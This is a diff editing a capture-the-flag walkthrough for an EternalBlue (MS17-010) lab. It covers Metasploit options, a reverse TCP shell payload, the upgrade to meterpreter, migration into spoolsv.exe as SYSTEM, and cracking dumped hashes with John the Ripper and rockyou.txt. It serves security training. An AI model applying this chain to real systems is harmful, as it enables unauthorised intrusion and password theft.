@@ -55,13 +55,13 @@ search ms17-010
   input is needed from us.
 - RHOSTS needs to be added, this will be the target's IP.
   You will also see LHOST and LPORT near the bottom of the screen.
-  LHOST is "Listener's IP" and its assigned port. You IP will be
-  automatically listed next to LHOST, but we will need to set up
-  a listening station of our own to receive the outcome of the exploit.
+  Your IP will be automatically listed next to LHOST. If it's not
+  your tun0 (openvpn) IP, you should change that.
 
 - Back on your Metasploit tab, make sure to set rhosts to the victim's IP
   I like to type out the IP as a double-check for myself
-  Also set the lhost to your openvpn's IP (tun0 result after ifconfig)
+  Also double check that the lhost is your openvpn's IP 
+  (tun0 result after ifconfig)
 
 set rhosts 10.10.235.204
 set lhost (Your system IP)
@@ -77,12 +77,14 @@ set lhost (Your system IP)
 > set payload generic/shell_reverse_tcp
     Then run again.
 - When you reach a success, you'll see a Windows command line prompt
-  in the Metasploit console.
+  in the Metasploit console. If "WIN!" appears, but not the command
+  line, press enter.
 
       Task 3
 
 - Next you'll want to background this shell CTRL+Z
 - We need to take this shell and upgrade it to *meterpreter*
+
   In order to do this, you'll type in the msfconsole:
 
 > use post/multi/manage/shell_to_meterpreter
@@ -98,6 +100,7 @@ set lhost (Your system IP)
   we need.
 
 - Type "sessions" to confirm that you are in fact running meterpreter
+
   Then type
 
 > sessions -i 2
@@ -114,33 +117,32 @@ whoami
   nt authority\system
 
   Hit CTRL+Z to background that shell. You'll be back in meterpreter.
+  
 - Next, we'll be migrating to a more stable process. Type "ps"
   You'll see a list of services and their ID numbers.
   The key to this is finding a service that will likely be stable.
-  For this box, "spoolsv.exe" was recommended to me, so we'll be
-  using this. It's a printer service, so it's got Authority permissions
-  and is reliably stable.
+  spoolsv.exe is a common service that's stable.
+  It's a printer service, so it's got Authority permissions.
   In my system, spoolsv.exe is marked as 1304 in the far left column.
   It may vary on yours. Find the number for spoolsv.exe and make note of it
+  
 - Focusing back on the command line, type
 
 migrate 1304
 
-You'll likely see "Migration completed successfully."
-If not, you can pick a different NT AUTHORITY labeled service and try
-to migrate to that. The important thing to note:
-You can migrate from "authority" to "authority" without losing privileges,
-but if you move from "authority" to a lower tier, you can't migrate
-back up.
+  You'll likely see "Migration completed successfully."
+  If not, you can pick a different NT AUTHORITY labeled service and try
+  to migrate to that. The important thing to note:
+  You can migrate from "authority" to "authority" without losing privileges,
+  but if you move from "authority" to a lower tier, you can't migrate
+  back up.
 
 
 Flags:
 1 - post/multi/manage/shell_to_meterpreter
 2 - SESSION
 
-        Task 4
-
-Onto password cracking
+        Task 4 - Onto password cracking
 
 - Now that you've migrated, you can go ahead and type "getuid" and
   verify that you're still system authority.
@@ -161,11 +163,12 @@ echo "paste_text_here" > pass.hash
 - We'll use John the Ripper to crack this password. The binary is
   "john", and you'll need to either be root or use sudo to run it.
   We will also need to find our wordlist. We'll be using rockyou.txt,
-  which will be loaded on your Kali system, if that's the OS you're using.
+  which will be loaded on your Kali system if that's the OS you're using.
   rockyou.txt is available lots of places online if you're using a
-  different OS.
-  If you don't know where it's located, you can type
+  different OS. I've found it on github.
+  If you don't know where it's located on your system, you can type
 
+updatedb
 locate rockyou.txt
 
   Mine is in /usr/share/wordlists/ and was compressed, so you may
